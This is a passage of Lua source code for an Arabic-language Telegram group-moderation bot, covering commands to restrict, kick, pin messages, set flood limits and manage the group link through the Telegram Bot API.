send(msg.chat_id_, msg.id_, "\n*✦┇لا يمكنك (طرد ꒐ حظر ꒐ كتم ꒐ تقييد) *( "..Get_Rank(result.id_,msg.chat_id_).." )")
return false 
end      
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
local UserName = (data.username_ or "TEAM_Neverland")
local NameUserr = "\n*✦┇المستخدم ↜* ["..data.first_name_.."](T.me/"..UserName..")\n"
local keyboard = {}
keyboard.inline_keyboard = {
{
{text = 'الغاء الامر',callback_data=msg.sender_user_id_..'/unkkid'..result.id_}
}
}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(NameUserr.."✦┇تم تقييده من المجموعه").."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)   
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^تقيد (%d+)$") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local userid = text:match("^تقيد (%d+)$")
if Rank_Checking(userid, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n*✦┇لا يمكنك (طرد ꒐ حظر ꒐ كتم ꒐ تقييد) *( "..Get_Rank(userid,msg.chat_id_).." )")
else
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
local UserName = (data.username_ or "TEAM_Neverland")
local NameUserr = "\n*✦┇المستخدم ↜* ["..data.first_name_.."](T.me/"..UserName..")\n"
local keyboard = {}
keyboard.inline_keyboard = {
{
{text = 'الغاء الامر',callback_data=msg.sender_user_id_..'/unkkid'..userid}
}
}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(NameUserr.."✦┇تم تقييده من المجموعه").."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)   

end
return false
end
------------------------------------------------------------------------
if text == ("الغاء تقيد") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
function Function_Neverland(extra, result, success)
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Reply_Status(msg,result.sender_user_id_,"reply","✦┇تم الغاء تقييده")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^الغاء تقيد @(.*)$") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^الغاء تقيد @(.*)$")
function Function_Neverland(extra, result, success)
if result.id_ then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Reply_Status(msg,result.id_,"reply","✦┇تم الغاء تقييده")  
else
send(msg.chat_id_, msg.id_, "✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^الغاء تقيد (%d+)$") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local userid = text:match("^الغاء تقيد (%d+)$")
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Reply_Status(msg,userid,"reply","✦┇تم الغاء تقييده")  
return false
end
if text == ("طرد") and msg.reply_to_message_id_ ~=0 and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if not Constructor(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✦┇لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
return false
end
function Function_Neverland(extra, result, success)
if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n*✦┇لا يمكنك (طرد ꒐ حظر ꒐ كتم ꒐ تقييد) *( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"✦┇ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"✦┇البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
Kick_Group(result.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","*✦┇تم طرده من هنا*")  
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end  
if text and text:match("^طرد @(.*)$") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end 
local username = text:match("^طرد @(.*)$")
if not Constructor(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✦┇لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
return false
end
function Function_Neverland(extra, result, success)
if result.id_ then
if Rank_Checking(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n*✦┇لا يمكنك (طرد ꒐ حظر ꒐ كتم ꒐ تقييد) *( "..Get_Rank(result.id_,msg.chat_id_).." )")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"✦┇ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"✦┇البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
Kick_Group(msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","✦┇تم طرده من هنا")  
end,nil)   
end
else
send(msg.chat_id_, msg.id_, "✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end  

if text and text:match("^طرد (%d+)$") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end 
local userid = text:match("^طرد (%d+)$") 
if not Constructor(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✦┇لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
return false
end
if Rank_Checking(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n*✦┇لا يمكنك (طرد ꒐ حظر ꒐ كتم ꒐ تقييد) *( "..Get_Rank(userid,msg.chat_id_).." )")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"✦┇ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"✦┇البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
Kick_Group(msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","✦┇تم طرده من هنا")  
end,nil)   
end
return false
end

if text == "تعطيل الطرد" or text == "تعطيل الحظر" then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if Constructor(msg) then
database:set(bot_id.."Ban:Cheking"..msg.chat_id_,"true")
send(msg.chat_id_, msg.id_, '*✦┇تم تعطيل ↜ الحظر ~ والطرد *')
return false
end
end
if text == "تفعيل الطرد" or text == "تفعيل الحظر" then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if Constructor(msg) then
database:del(bot_id.."Ban:Cheking"..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✦┇تم تفعيل ↜ الحظر ~ والطرد ')
return false
end
end
if text == "تعطيل الرفع" or text == "تعطيل الترقيه" then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if Constructor(msg) then
database:set(bot_id.."Add:Group:Cheking"..msg.chat_id_,"true")
send(msg.chat_id_, msg.id_, '*✦┇تم تعطيل رفع ↜ الادمن ~ المميز *')
return false
end
end
if text == "تفعيل الرفع" or text == "تفعيل الترقيه" then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if Constructor(msg) then
database:del(bot_id.."Add:Group:Cheking"..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✦┇تم تفعيل رفع ↜ الادمن ~ المميز ')
return false
end
end
if text == 'لقبه' and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
Gee = https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_)
GeIad = JSON.decode(Gee)
if not GeIad.result.custom_title then
send(msg.chat_id_, msg.id_,'✦┇وينكو لقب ') 
else
send(msg.chat_id_, msg.id_,'✦┇لقبك هو : '..GeIad.result.custom_title) 
end
end
end
if text == ("حذف لقب") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✦┇ البوت ليس مشرف يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇  العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'CUKUR_SO')..')'
status  = '\n✦┇  الايدي » `'..result.sender_user_id_..'`\n✦┇  تم حذف لقبه من الكروب'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^حذف لقب @(.*)$") and Constructor(msg) then
local username = text:match("^حذف لقب @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✦┇ البوت ليس مشرف يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇  عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
usertext = '\n✦┇  العضو » ['..result.title_..'](t.me/'..(username or 'CUKUR_SO')..')'
status  = '\n✦┇  تم حذف لقبه من الكروب'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '✦┇لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text == 'لقبي' and tonumber(msg.reply_to_message_id_) == 0 then
Ge = https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..msg.sender_user_id_)
GeId = JSON.decode(Ge)
if not GeId.result.custom_title then
send(msg.chat_id_, msg.id_,'✦┇وينكو لقب ') 
else
send(msg.chat_id_, msg.id_,'✦┇لقبك هو : '..GeId.result.custom_title) 
end
end
if text == "فحص البوت" and Owner(msg) then
local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
local getInfo = JSON.decode(chek)
if getInfo.ok == true then
if getInfo.result.can_change_info == true then
INf = 'مفعله' 
else 
INf = 'غير مفعله' 
end
if getInfo.result.can_delete_messages == true then
DEL = 'مفعله' 
else 
DEL = 'غير مفعله' 
end
if getInfo.result.can_invite_users == true then
INv = 'مفعله' 
else
INv = 'غير مفعله' 
end
if getInfo.result.can_pin_messages == true then
Pin = 'مفعله' 
else
Pin = 'غير مفعله' 
end
if getInfo.result.can_restrict_members == true then
REs = 'مفعله' 
else 
REs = 'غير مفعله' 
end
if getInfo.result.can_promote_members == true then
PRo = 'مفعله'
else
PRo = 'غير مفعله'
end 
send(msg.chat_id_, msg.id_,'\n ✦┇صلاحيات البوت هي \n— — — — — — — — —\n✦┇تغير معلومات المجموعة : '..INf..'\n✦┇حذف الرسائل : '..DEL..'\n✦┇حظر المستخدمين : '..REs..'\n✦┇دعوة المستخدمين : '..INv..'\n✦┇ثتبيت الرسالة : '..Pin..'\n✦┇اضافة مشرفين : '..PRo)   
end
end
if text ==("تثبيت") and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if database:sismember(bot_id.."Neverland:Lock:pin",msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_,"✦┇التثبيت والغاء التثبيت تم قفله من قبل المنشئين")  
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100",""),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"*✦┇تم تثبيت الرساله*")   
database:set(bot_id.."Neverland:Pin:Id:Msg"..msg.chat_id_,msg.reply_to_message_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_,"*✦┇انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله*")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"*✦┇ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات*")  
end
end,nil) 
end
if text == "الغاء التثبيت" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if database:sismember(bot_id.."Neverland:Lock:pin",msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_,"✦┇التثبيت والغاء التثبيت تم قفله من قبل المنشئين")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"✦┇تم الغاء تثبيت الرساله")   
database:del(bot_id.."Neverland:Pin:Id:Msg"..msg.chat_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_,"✦┇انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"✦┇ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil)
end
if text == 'الغاء تثبيت الكل' and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if database:sismember(bot_id.."Neverland:Lock:pin",msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_,"✦┇التثبيت والغاء التثبيت تم قفله من قبل المنشئين")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"✦┇تم الغاء تثبيت الكل")   
https.request('https://api.telegram.org/bot'..token..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
database:del(bot_id.."Neverland:Pin:Id:Msg"..msg.chat_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_,"✦┇انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"✦┇ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil)
end
if text and text:match("^وضع تكرار (%d+)$") and Addictive(msg) then   
local Num = text:match("وضع تكرار (.*)")
database:hset(bot_id.."Neverland:flooding:settings:"..msg.chat_id_ ,"floodmax" ,Num) 
send(msg.chat_id_, msg.id_,"✦┇تم وضع عدد التكرار ("..Num..")")  
end 
if text and text:match("^وضع زمن التكرار (%d+)$") and Addictive(msg) then   
local Num = text:match("^وضع زمن التكرار (%d+)$")
database:hset(bot_id.."Neverland:flooding:settings:"..msg.chat_id_ ,"floodtime" ,Num) 
send(msg.chat_id_, msg.id_,"✦┇تم وضع زمن التكرار ("..Num..")") 
end
if text == "تفعيل رابط" or text == 'تفعيل الرابط' then
if Addictive(msg) then  
database:set(bot_id.."Link_Group:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," *✦┇تم تفعيل الرابط*") 
return false  
end
end
if text == "تعطيل رابط" or text == 'تعطيل الرابط' then
if Addictive(msg) then  
database:del(bot_id.."Link_Group:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," *✦┇تم تعطيل الرابط*") 
return false end
end
if text == "ضع رابط" or text == 'وضع رابط' then
if msg.reply_to_message_id_ == 0  and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'  *✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت* \n*✦┇اشتࢪڪ هنا عمࢪي* ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_,msg.id_," *✦┇حسنآ ارسل اليه الرابط الان*")
database:setex(bot_id.."Neverland:Set:PNeverlandvate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_,120,true) 
return false
end
end
if text == "الرابط" then 
local status_Link = database:get(bot_id.."Link_Group:status"..msg.chat_id_)
if not status_Link then
send(msg.chat_id_, msg.id_,"> الرابط معطل") 
return false  
end
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
local link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_)            
if link then                              
